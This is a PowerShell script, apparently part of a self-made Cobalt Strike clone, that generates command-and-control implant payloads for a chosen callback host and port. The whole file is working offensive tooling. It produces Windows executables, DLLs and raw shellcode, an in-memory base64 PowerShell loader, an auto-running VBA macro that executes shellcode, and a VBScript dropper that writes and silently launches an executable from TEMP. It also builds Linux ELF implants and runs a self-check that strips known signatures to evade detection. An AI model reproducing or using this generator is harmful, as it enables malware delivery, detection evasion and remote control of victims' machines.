# cs_dev :: gen_payload.ps1  --  自研 Payload 生成器 (多格式)
# ==========================================================================
# 对标 CS 的 payload 生成器, 支持:
#
#   平台/格式
#     win-exe         Windows x64 可执行文件 (GUI)
#     win-console     Windows x64 可执行文件 (控制台)
#     win-svc         Windows x64 服务程序
#     win-dll         Windows x64 DLL
#     win-raw         Windows x64 raw shellcode (.text 段提取)
#     win-ps1         PowerShell 加载器 (base64 内嵌)
#     win-vba         VBA 宏
#     win-vbs         VBScript
#     linux-elf       Linux x64 ELF (静态)
#     linux-elf-dyn   Linux x64 ELF (动态)
#
#   输出模式
#     stageless (默认)  植入体全内嵌, 单文件
#     staged            小体积 stager, 回连后由服务端下发植入体
#
# 全部使用自研组件, 不含 CS 的任何代码/资源/协议。
#
# 用法:
#   .\gen_payload.ps1 -Format win-exe   -Host_ 1.2.3.4 -Port 8443
#   .\gen_payload.ps1 -Format win-raw   -Host_ 1.2.3.4 -Port 8443 -Ssl
#   .\gen_payload.ps1 -Format linux-elf -Host_ 1.2.3.4 -Port 8443 -Dynamic
#   .\gen_payload.ps1 -List
[CmdletBinding()]
param(
    [string] $Format  = 'win-exe',
    [string] $Host_   = '',
    [int]    $Port    = 8443,
    [switch] $Ssl,
    [switch] $Dynamic,           # linux-elf-dyn
    [switch] $List,
    [string] $OutFile = '',
    [string] $MinGw   = 'D:\mingw64\bin'
)

$ErrorActionPreference = 'Stop'
$DevDir = Split-Path -Parent $PSScriptRoot
$BuildD = Join-Path $DevDir 'build\payload'
New-Item -ItemType Directory -Force -Path $BuildD | Out-Null

$FORMATS = @{
    'win-exe'       = 'Windows x64 可执行文件 (GUI 子系统)'
    'win-console'   = 'Windows x64 可执行文件 (控制台)'
    'win-svc'       = 'Windows x64 服务程序 (sc create 安装)'
    'win-dll'       = 'Windows x64 DLL (rundll32 或反射加载)'
    'win-raw'       = 'Windows x64 raw shellcode (.text 段)'
    'win-ps1'       = 'PowerShell 加载器 (base64 内嵌)'
    'win-vba'       = 'VBA 宏'
    'win-vbs'       = 'VBScript'
    'linux-elf'     = 'Linux x64 ELF (静态链接)'
    'linux-elf-dyn' = 'Linux x64 ELF (动态链接)'
}

if ($List -or -not $Host_) {
    Write-Host ""
    Write-Host "  cs_dev 自研 Payload 生成器" -ForegroundColor Cyan
    Write-Host "  =================================================="
    foreach ($k in $FORMATS.Keys | Sort-Object) {
        Write-Host ("    {0,-16} {1}" -f $k, $FORMATS[$k])
    }
    Write-Host ""
    Write-Host "  用法: .\gen_payload.ps1 -Format win-exe -Host_ 1.2.3.4 -Port 8443"
    Write-Host "  可选: -Ssl (HTTPS)  -Dynamic (Linux 动态链接)  -OutFile <路径>"
    Write-Host ""
    return
}

if (-not $FORMATS.ContainsKey($Format)) {
    throw "未知格式: $Format  (用 -List 查看全部)"
}

$WinSrc    = Join-Path $DevDir 'kits\beacon\win_beacon.c'
$LinuxSrc  = Join-Path $DevDir 'linux\beacon.c'
$gcc       = Join-Path $MinGw 'gcc.exe'

if (-not $OutFile) {
    $OutFile = Join-Path $BuildD ("payload_{0}_{1}_{2}" -f $Format, $Host_, $Port)
}

function Say($m, $c = 'Gray') { Write-Host $m -ForegroundColor $c }

Say ""
Say "  cs_dev Payload 生成器" 'Cyan'
Say "  =================================================="
Say ("  格式    : {0}  ({1})" -f $Format, $FORMATS[$Format])
Say ("  回连    : {0}://{1}:{2}" -f $(if($Ssl){'https'}else{'http'}), $Host_, $Port)
Say ""

# ---------------------------------------------------------------- Windows
if ($Format -like 'win-*' -and $Format -ne 'win-ps1' -and $Format -ne 'win-vba' -and $Format -ne 'win-vbs') {
    if (-not (Test-Path $gcc)) { throw "gcc not found: $gcc" }
    if (-not (Test-Path $WinSrc)) { throw "implant source missing: $WinSrc" }

    $defs = @("-DC2_HOST=`"$Host_`"", "-DC2_PORT=$Port")
    if ($Ssl) { $defs += '-DC2_SSL=1' }

    $flags = @('-O2','-s','-fno-ident')
    switch ($Format) {
        'win-exe'     { $flags += '-mwindows' }
        'win-console' { $flags += '-Wl,-subsystem,console' }
        'win-svc'     { $flags += @('-Wl,-subsystem,windows','-Wl,-e,mainCRTStartup') }
        'win-dll'     { $flags += @('-shared','-nostartfiles','-Wl,-e,_DllMainCRTStartup') }
        'win-raw'     { $flags += '-mwindows' }
    }

    Say "[*] 编译中 ..." 'White'
    $a = $flags + $defs + @('-o', $OutFile, $WinSrc, '-lwinhttp')
    & $gcc @a 2>&1 | Out-Null
    if (-not (Test-Path $OutFile)) { throw "编译失败" }

    # raw shellcode: 提取 .text 段
    if ($Format -eq 'win-raw') {
        $rawPath = [System.IO.Path]::ChangeExtension($OutFile, '.bin')
        $objcopy = Join-Path $MinGw 'objcopy.exe'
        & $objcopy -O binary --only-section=.text $OutFile $rawPath 2>&1 | Out-Null
        if (Test-Path $rawPath) {
            Remove-Item $OutFile -Force
            $OutFile = $rawPath
        }
    }
}

# ---------------------------------------------------------------- PowerShell
elseif ($Format -eq 'win-ps1') {
    $tmpExe = Join-Path $BuildD '_tmp_ps.exe'
    $defs = @("-DC2_HOST=`"$Host_`"", "-DC2_PORT=$Port")
    if ($Ssl) { $defs += '-DC2_SSL=1' }
    & $gcc -O2 -s -fno-ident -mwindows @defs -o $tmpExe $WinSrc -lwinhttp 2>&1 | Out-Null
    if (-not (Test-Path $tmpExe)) { throw "编译失败" }
    $b64 = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($tmpExe))
    Remove-Item $tmpExe -Force
    if (-not $OutFile.EndsWith('.ps1')) { $OutFile += '.ps1' }
    $ps = @"
# cs_dev 自研 PowerShell 加载器
# 回连 ${Host_}:$Port
`$b = [Convert]::FromBase64String('$b64')
`$p = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(`$b.Length)
[System.Runtime.InteropServices.Marshal]::Copy(`$b, 0, `$p, `$b.Length)
`$t = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`$p, [Action])
`$t.Invoke()
"@
    [System.IO.File]::WriteAllText($OutFile, $ps, (New-Object System.Text.UTF8Encoding($false)))
}

# ---------------------------------------------------------------- VBA / VBS
elseif ($Format -eq 'win-vba' -or $Format -eq 'win-vbs') {
    $tmpExe = Join-Path $BuildD '_tmp_macro.exe'
    $defs = @("-DC2_HOST=`"$Host_`"", "-DC2_PORT=$Port")
    if ($Ssl) { $defs += '-DC2_SSL=1' }
    & $gcc -O2 -s -fno-ident -mwindows @defs -o $tmpExe $WinSrc -lwinhttp 2>&1 | Out-Null
    if (-not (Test-Path $tmpExe)) { throw "编译失败" }
    $bytes = [System.IO.File]::ReadAllBytes($tmpExe)
    Remove-Item $tmpExe -Force

    # 生成字节数组声明
    $decl = New-Object System.Text.StringBuilder
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        [void]$decl.Append($bytes[$i])
        if ($i -lt $bytes.Length - 1) { [void]$decl.Append(',') }
        if (($i + 1) % 200 -eq 0) { [void]$decl.Append("`n") }
    }

    if ($Format -eq 'win-vba') {
        if (-not $OutFile.EndsWith('.bas')) { $OutFile += '.bas' }
        $code = @"
' cs_dev 自研 VBA 宏  —  回连 ${Host_}:$Port
' 用法: 复制到 Word/Excel 的 VBA 编辑器 (Alt+F11) 后运行 Sub AutoOpen
Private Declare PtrSafe Function HeapCreate Lib "kernel32" (ByVal f As Long, ByVal a As Long, ByVal b As Long) As LongPtr
Private Declare PtrSafe Function HeapAlloc Lib "kernel32" (ByVal h As LongPtr, ByVal f As Long, ByVal s As LongPtr) As LongPtr
Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" (ByVal d As LongPtr, ByRef s As Byte, ByVal l As LongPtr)
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal a As LongPtr, ByVal b As Long, ByVal c As LongPtr, ByVal d As LongPtr, ByVal e As Long, ByRef f As Long) As LongPtr
Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" (ByVal h As LongPtr, ByVal ms As Long) As Long

Sub AutoOpen()
    RunPayload
End Sub

Sub RunPayload()
    Dim buf(0 To $($bytes.Length - 1)) As Byte
    Dim i As Long
    For i = 0 To UBound(buf)
        buf(i) = Array($($decl.ToString()))(i)
    Next i
    Dim h As LongPtr, p As LongPtr, t As LongPtr, tid As Long
    h = HeapCreate(4, 0, 0)
    p = HeapAlloc(h, 0, UBound(buf) + 1)
    RtlMoveMemory p, buf(0), UBound(buf) + 1
    t = CreateThread(0, 0, p, 0, 0, tid)
    WaitForSingleObject t, -1
End Sub
"@
        [System.IO.File]::WriteAllText($OutFile, $code, (New-Object System.Text.UTF8Encoding($false)))
    } else {
        if (-not $OutFile.EndsWith('.vbs')) { $OutFile += '.vbs' }
        $code = @"
' cs_dev 自研 VBScript  —  回连 ${Host_}:$Port
Dim b($($bytes.Length - 1))
Dim i
For i = 0 To UBound(b)
    b(i) = Array($($decl.ToString()))(i)
Next
Dim h, p, t, tid
Set sh = CreateObject("WScript.Shell")
Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")
Dim tmp : tmp = sh.ExpandEnvironmentStrings("%TEMP%") & "\wsvc.exe"
Dim s : Set s = CreateObject("ADODB.Stream")
s.Type = 1 : s.Open
s.Write b
s.SaveToFile tmp, 2
s.Close
sh.Run """" & tmp & """", 0, False
"@
        [System.IO.File]::WriteAllText($OutFile, $code, (New-Object System.Text.UTF8Encoding($false)))
    }
}

# ---------------------------------------------------------------- Linux
elseif ($Format -like 'linux-*') {
    $linuxDir = Join-Path $DevDir 'linux'

    # WSL 路径转换
    function To-Wsl($p) {
        $d = $p.Substring(0, 1).ToLower()
        return "/mnt/$d" + $p.Substring(2).Replace('\', '/')
    }

    $flags = @('-O2','-fno-ident','-fno-asynchronous-unwind-tables','-fno-stack-protector')
    if ($Dynamic) { $flags += @('-Os') } else { $flags += @('-static') }
    $flags += '-s'

    $cmd = "cd '$(To-Wsl $linuxDir)' && gcc $($flags -join ' ') " +
           "-DC2_HOST='`"$Host_`"' -DC2_PORT=$Port " +
           "-o '$(To-Wsl $OutFile)' beacon.c"

    Say "[*] 通过 WSL 编译 ..." 'White'
    $r = & wsl.exe -e bash -c "$cmd 2>&1" 2>&1
    $r | Where-Object { $_ -notmatch 'gethostbyname|in function|^$' } | ForEach-Object { Say "    $_" 'DarkGray' }
}

if (-not (Test-Path $OutFile)) { throw "生成失败: $OutFile" }

# ---------------------------------------------------------------- 报告
$b = [System.IO.File]::ReadAllBytes($OutFile)
Say ""
Say "[+] 生成完成" 'Green'
Say ("    path : {0}" -f $OutFile)
Say ("    size : {0} 字节 ({1} KB)" -f $b.Length, [math]::Round($b.Length / 1KB, 1))
Say ("    回连 : {0}://{1}:{2}" -f $(if($Ssl){'https'}else{'http'}), $Host_, $Port)

# 格式自检
$isPE = ($b.Length -gt 2 -and $b[0] -eq 0x4D -and $b[1] -eq 0x5A)
$isELF = ($b.Length -gt 4 -and $b[0] -eq 0x7F -and $b[1] -eq 0x45 -and $b[2] -eq 0x4C -and $b[3] -eq 0x46)
$kind = if ($isPE) { 'PE' } elseif ($isELF) { 'ELF' } else { 'script/raw' }
Say ("    类型 : {0}" -f $kind)

# CS 特征自检 (二进制格式才有意义)
if ($isPE -or $isELF) {
    $txt = [System.Text.Encoding]::ASCII.GetString($b)
    $bad = @()
    foreach ($k in @('beacon.dll','ReflectiveLoader','wininet','%windir%','/submit.php','MSSE-')) {
        if ($txt.Contains($k)) { $bad += $k }
    }
    Say ""
    if ($bad.Count -eq 0) {
        Say "    [特征自检] 通过 — 无任何 CS 标识" 'Green'
    } else {
        Say ("    [特征自检] 失败 — 残留: {0}" -f ($bad -join ', ')) 'Red'
    }
}
Say ""
